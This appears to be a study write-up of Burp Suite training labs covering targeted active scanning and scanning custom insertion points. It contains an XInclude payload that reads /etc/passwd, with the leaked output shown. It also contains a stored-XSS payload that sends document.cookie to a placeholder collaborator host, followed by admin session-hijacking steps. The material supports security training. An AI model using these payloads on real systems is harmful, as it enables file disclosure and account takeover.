### Using Burp Scanner during manual testing
### Scanning a specific request
When you come across an interesting function or behavior, your first instinct may be to send the relevant requests to Repeater or Intruder and investigate further. But it's often beneficial to hand the request to Burp Scanner as well. It can get to work on the more repetitive aspects of testing while you put your skills to better use elsewhere.

If you right-click on a request and select `Do active scan`, Burp Scanner will use its default configuration to audit only this request. 

This may not catch every last vulnerability, but it could potentially flag things up in seconds that could otherwise have taken hours to find. It may also help you to rule out certain attacks almost immediately. You can still perform more targeted testing using Burp's manual tools, but you'll be able to focus your efforts on specific inputs and a narrower range of potential vulnerabilities.

Even if you already use Burp Scanner to run a general crawl and audit of new targets, switching to this more targeted approach to auditing can massively reduce your overall scan time. 

### PRACTITIONER Lab: Discovering vulnerabilities quickly with targeted scanning
There's a request:
```bash
POST /product/stock HTTP/2
Host: 0a55007204e9ab888040eeb200ee00be.web-security-academy.net

productId=1&storeId=1
```

We do active scan on it and we see that it is vulnerable to xxe. Burp sent this request:
```bash
POST /product/stock HTTP/2
Host: 0a55007204e9ab888040eeb200ee00be.web-security-academy.net

productId=%3ccyx%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a%2f%2f7z7tw6cnc9etmx00co3x1l3ap1vujl7mvei46t.oastify.com%2ffoo%22%2f%3e%3c%2fcyx%3e&storeId=1
```
Which makes a request to an external site but we need to get /etc/passwd file so we change the req body to the following:
```bash
productId=<cyx+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></cyx>&storeId=1
```
In the response we get:
```bash
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2338

"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
...
```

### Scanning non-standard data structures
As you're free to define insertion points in arbitrary positions, you can also target a specific substring within a value. Among other things, this can be useful for scanning non-standard data structures.

When dealing with common formats, such as JSON, Burp Scanner is able to parse the data and place payloads in the correct positions without breaking the structure. However, consider a parameter that looks something like this:
```bash
user=048857-carlos
```
Using our intuition, we can take a guess that this will be treated as two distinct values by the back-end: an ID of some kind and what appears to be a username, separated by a hyphen. However, Burp Scanner will treat this all as a single value. As a result, it will just place payloads at the end of the parameter, or replace the value entirely.

To help scan non-standard data structures, you can scan a single part of a parameter. In this example you may want to target carlos. You can highlight carlos in the message editor, then right-click and select `Scan selected insertion point`. 

### PRACTITIONER Lab: Scanning non-standard data structures
Official lab's solution:
- Log in to your account with the provided credentials.
- In Burp, go to the Proxy > HTTP history tab.
- Find the GET /my-account?id=wiener request, which contains your new authenticated session cookie.
- Study the session cookie and notice that it contains your username in cleartext, followed by a token of some kind. These are separated by a colon, which suggests that the application may treat the cookie value as two distinct inputs.
- Select the first part of the session cookie, the cleartext wiener.
- Right-click and select `Scan selected insertion point`, then click OK.
- Go to the Dashboard and wait for the scan to complete.

Approximately one minute after the scan starts, notice that Burp Scanner reports a Cross-site scripting (stored) issue. It has detected this by triggering an interaction with the Burp Collaborator server. 

> Note:
>
> The delay in reporting the issue is due to the polling interval. By default, Burp polls the Burp Collaborator server for new interactions every minute. 

Steal the admin user's cookies
- In the Dashboard, select the identified issue.
- In the lower panel, open the Request tab. This contains the request that Burp Scanner used to identify the issue.
- Send the request to Burp Repeater.
- Go to the Collaborator tab and click Copy to clipboard. A new Burp Collaborator payload is saved to your clipboard.
- Go to the Repeater tab and use the Inspector to view the cookie in its decoded form.
- Using the Collaborator payload you just copied, replace the proof-of-concept that Burp Scanner used with an exploit that exfiltrates the victim's cookies. For example: 
```bash
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
```
Note that you need to preserve the second part of the cookie containing your session ID. 

- Click Apply changes, and then click Send.
- Go back to the Collaborator tab. After approximately one minute, click Poll now. Notice that the Collaborator server has received new DNS and HTTP interactions.
- Select one of the HTTP interactions.
- On the Request to Collaborator tab, notice that the path of the request contains the admin user's cookies. 

Use the admin user's cookie to access the admin panel
- Copy the admin user's session cookie.
- Go to Burp's browser and open the DevTools menu.
- Go to the Application tab and select Cookies.
- Replace your session cookie with the admin user's session cookie, and refresh the page.
- Access the admin panel and delete carlos to solve the lab.

### Note:
You can also use Intruder to define multiple insertion points. In the example above, you can define insertion points for 048857 and carlos, then right-click and select `Scan defined insertion points`. 
